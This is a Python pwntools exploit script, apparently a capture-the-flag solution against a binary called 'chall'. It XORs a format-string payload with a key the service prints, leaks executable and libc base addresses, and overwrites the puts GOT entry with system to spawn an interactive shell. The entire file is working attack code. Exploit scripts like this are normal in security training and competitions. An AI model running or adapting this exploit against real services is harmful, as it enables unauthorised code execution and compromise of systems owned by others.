#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')
libc = ELF(args.LIBC or 'libc.so.6')
context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'error'

host = args.HOST or 'localhost'
port = int(args.PORT or 30879)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

gdbscript = '''
tbreak *(chall +188)
continue
'''.format(**locals())

def pay(x):
    p.sendlineafter(b":", x)

def ua(x):
    return int.from_bytes(x, 'little')

p = start()

xor_key = eval(p.recvline_contains(b"XOR").split()[-1])

pay(xor(f"%67$p|%46$p\0".encode(), xor_key))
exe_leak, libc_leak = (
    p.recvline_contains(b"username").split()[-1].split(b"|")
)

exe.address = eval(exe_leak) - (exe.sym.main)
libc.address = eval(libc_leak) - libc.sym._IO_2_1_stderr_

print(f"exe: {hex(exe.address)}")
print(f"libc: {hex(libc.address)}")


p1, p2 = fmtstr_split(
    34 + 2,
    {
        exe.sym.message: ua(b"sh;"),
        exe.got.puts: libc.sym.system,
    },
    write_size="short",
)

payload = xor(p1, xor_key).ljust(80) + p2
print(len(payload))
pay(payload)

pay(b"test\0")
pay(b"ls")
p.interactive()


